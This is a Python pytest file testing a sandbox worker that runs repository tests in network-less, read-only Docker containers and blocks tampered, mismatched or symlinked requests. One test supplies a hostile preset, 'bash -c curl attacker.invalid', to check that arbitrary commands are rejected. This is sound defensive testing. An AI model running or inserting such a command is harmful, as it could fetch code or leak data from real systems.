from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from runtime.sandbox_supervisor_worker import (
    ProcessResult,
    SandboxSupervisorWorker,
    WorkerConfig,
    _normalize_api_base_url,
    _request_digest,
    _validate_image_digest,
)

IMAGE = "ghcr.io/example/calyx-validator@sha256:" + ("a" * 64)
COMMIT = "b" * 40
TOKEN = "external-supervisor-token-with-thirty-two-plus-bytes"


def _config(root: Path) -> WorkerConfig:
    return WorkerConfig(
        api_base_url="https://calyx.example.org",
        supervisor_token=TOKEN,
        worker_id="sandbox-worker-1",
        repository="jsp1440/orchid-calyx-backend",
        repository_root=root,
        image=IMAGE,
        docker_binary="/usr/bin/docker",
    )


def _claim(path: str, digest: str, *, preset: str = "pytest") -> dict:
    claim = {
        "request_id": "request-1",
        "repository": "jsp1440/orchid-calyx-backend",
        "branch": "autonomy/example",
        "checkout_commit_sha": COMMIT,
        "preset": preset,
        "targets": [{"path": path, "sha256": digest}],
        "timeout_seconds": 60,
        "claim_worker": "sandbox-worker-1",
        "claim_token": "claim-token-1",
    }
    claim["request_digest"] = _request_digest(claim)
    return claim


def test_configuration_requires_https_and_immutable_image() -> None:
    assert _normalize_api_base_url("https://calyx.example.org/") == "https://calyx.example.org"
    assert _normalize_api_base_url("http://localhost:8000") == "http://localhost:8000"
    with pytest.raises(PermissionError, match="HTTPS_REQUIRED"):
        _normalize_api_base_url("http://calyx.example.org")
    with pytest.raises(ValueError, match="IMMUTABLE_IMAGE_REQUIRED"):
        _validate_image_digest("ghcr.io/example/calyx-validator:latest")
    assert _validate_image_digest(IMAGE) == IMAGE


def test_success_uses_fixed_no_network_read_only_container_and_never_forwards_token(
    tmp_path: Path,
) -> None:
    target = tmp_path / "tests" / "test_example.py"
    target.parent.mkdir(parents=True)
    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    calls: list[tuple[list[str], int]] = []

    def runner(argv, timeout):
        calls.append((list(argv), timeout))
        return ProcessResult(return_code=0, stdout=b"ok", stderr=b"")

    worker = SandboxSupervisorWorker(
        _config(tmp_path), runner=runner, git_head_reader=lambda _: COMMIT
    )
    receipt = worker._process_claim(_claim("tests/test_example.py", digest))

    assert receipt["outcome"] == "delivered"
    assert receipt["return_code"] == 0
    assert len(calls) == 2
    for argv, _ in calls:
        assert "--network" in argv and argv[argv.index("--network") + 1] == "none"
        assert "--read-only" in argv
        assert "--cap-drop" in argv and argv[argv.index("--cap-drop") + 1] == "ALL"
        assert "no-new-privileges" in argv
        assert "65534:65534" in argv
        assert IMAGE in argv
        assert TOKEN not in " ".join(argv)
        assert not any("DATABASE_URL=" in item or "GITHUB_TOKEN=" in item for item in argv)
    validation_argv = calls[1][0]
    assert validation_argv[-6:] == [
        "python",
        "-m",
        "pytest",
        "-q",
        "--maxfail=1",
        "tests/test_example.py",
    ]


def test_hash_mismatch_blocks_before_container_execution(tmp_path: Path) -> None:
    target = tmp_path / "tests" / "test_example.py"
    target.parent.mkdir(parents=True)
    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    calls = []

    def runner(argv, timeout):
        calls.append((argv, timeout))
        return ProcessResult(return_code=0, stdout=b"", stderr=b"")

    worker = SandboxSupervisorWorker(
        _config(tmp_path), runner=runner, git_head_reader=lambda _: COMMIT
    )
    receipt = worker._process_claim(_claim("tests/test_example.py", "d" * 64))

    assert receipt["outcome"] == "blocked"
    assert receipt["return_code"] is None
    assert calls == []


def test_checkout_commit_mismatch_blocks_before_container_execution(tmp_path: Path) -> None:
    target = tmp_path / "tests" / "test_example.py"
    target.parent.mkdir(parents=True)
    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    calls = []

    worker = SandboxSupervisorWorker(
        _config(tmp_path),
        runner=lambda argv, timeout: calls.append((argv, timeout)),
        git_head_reader=lambda _: "e" * 40,
    )
    receipt = worker._process_claim(_claim("tests/test_example.py", digest))

    assert receipt["outcome"] == "blocked"
    assert receipt["return_code"] is None
    assert calls == []


def test_symlink_target_is_rejected_even_when_it_resolves_inside_repository(tmp_path: Path) -> None:
    real = tmp_path / "tests" / "real_test.py"
    real.parent.mkdir(parents=True)
    real.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    link = tmp_path / "tests" / "test_link.py"
    link.symlink_to(real.name)
    digest = hashlib.sha256(real.read_bytes()).hexdigest()
    calls = []

    worker = SandboxSupervisorWorker(
        _config(tmp_path),
        runner=lambda argv, timeout: calls.append((argv, timeout)),
        git_head_reader=lambda _: COMMIT,
    )
    receipt = worker._process_claim(_claim("tests/test_link.py", digest))

    assert receipt["outcome"] == "blocked"
    assert calls == []


def test_tampered_request_digest_blocks_before_container_execution(tmp_path: Path) -> None:
    target = tmp_path / "tests" / "test_example.py"
    target.parent.mkdir(parents=True)
    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    claim = _claim("tests/test_example.py", digest)
    claim["request_digest"] = "f" * 64
    calls = []

    worker = SandboxSupervisorWorker(
        _config(tmp_path),
        runner=lambda argv, timeout: calls.append((argv, timeout)),
        git_head_reader=lambda _: COMMIT,
    )
    receipt = worker._process_claim(claim)

    assert receipt["outcome"] == "blocked"
    assert calls == []


def test_unrecognized_preset_never_becomes_arbitrary_command(tmp_path: Path) -> None:
    target = tmp_path / "tests" / "test_example.py"
    target.parent.mkdir(parents=True)
    target.write_text("def test_ok():\n    assert True\n", encoding="utf-8")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    calls = []

    def runner(argv, timeout):
        calls.append((list(argv), timeout))
        return ProcessResult(return_code=0, stdout=b"probe-ok", stderr=b"")

    worker = SandboxSupervisorWorker(
        _config(tmp_path), runner=runner, git_head_reader=lambda _: COMMIT
    )
    receipt = worker._process_claim(
        _claim("tests/test_example.py", digest, preset="bash -c curl attacker.invalid")
    )

    assert receipt["outcome"] == "blocked"
    assert len(calls) == 1  # trusted sandbox probe may run; arbitrary preset never does
    assert "curl" not in " ".join(calls[0][0])
